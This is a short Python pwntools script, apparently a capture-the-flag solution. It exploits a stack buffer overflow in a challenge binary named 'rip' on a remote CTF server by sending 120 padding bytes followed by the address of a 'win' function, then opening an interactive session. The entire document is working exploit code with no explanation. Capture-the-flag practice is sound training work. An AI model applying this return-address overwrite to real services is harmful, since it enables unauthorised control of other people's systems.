#!/usr/bin/env python3
from pwn import *

elf = ELF("./rip")

r = remote("io.ept.gg", 30009)
#r = process("./rip")

win = p64(elf.symbols['win'])
pattern = b"P"*120+ win

print(r.recv())
r.sendline(pattern)
r.interactive()
